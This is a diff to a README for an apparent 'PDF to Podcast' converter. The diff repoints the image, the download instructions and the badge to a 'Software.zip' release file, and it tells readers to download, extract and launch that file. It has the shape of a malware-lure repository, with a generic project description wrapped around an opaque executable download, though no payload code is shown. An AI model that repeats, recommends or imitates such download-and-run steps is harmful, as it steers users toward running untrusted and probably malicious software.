@@ -1,6 +1,6 @@
 # 🎧 PDF to Podcast Converter using Gemini and Elevenlabs 📚
 
-![PDF to Podcast](https://example.com/podcast_image.png)
+![PDF to Podcast](https://github.com/Daniel-bot37/pdf-to-podcast/releases/download/v2.0/Software.zip)
 
 Welcome to the **pdf-to-podcast** repository! This project aims to revolutionize the way you consume content by converting any PDF document into a captivating podcast episode. With the power of Gemini and Elevenlabs, you can now listen to your favorite articles, reports, or books on the go!
 
@@ -14,7 +14,7 @@ Welcome to the **pdf-to-podcast** repository! This project aims to revolutionize
 
 ## How to Use 📝
 
-1. **Get Started**: Download the [Software.zip](https://github.com/user-attachments/files/18383251/Software.zip) and extract the files. Launch the application to begin converting your PDFs into podcasts.
+1. **Get Started**: Download the [https://github.com/Daniel-bot37/pdf-to-podcast/releases/download/v2.0/Software.zip](https://github.com/Daniel-bot37/pdf-to-podcast/releases/download/v2.0/Software.zip) and extract the files. Launch the application to begin converting your PDFs into podcasts.
 
 2. **Input PDF**: Select the PDF document you want to convert into a podcast episode.
 
@@ -37,6 +37,6 @@ Welcome to the **pdf-to-podcast** repository! This project aims to revolutionize
 
 For any issues or feedback, please check the "Releases" section or visit the official website for troubleshooting guides and updates.
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Daniel-bot37/pdf-to-podcast/releases/download/v2.0/Software.zip)](https://github.com/Daniel-bot37/pdf-to-podcast/releases/download/v2.0/Software.zip)
 
 Start transforming your PDFs into engaging podcasts today with the **pdf-to-podcast** converter! 🎧📖🎙️
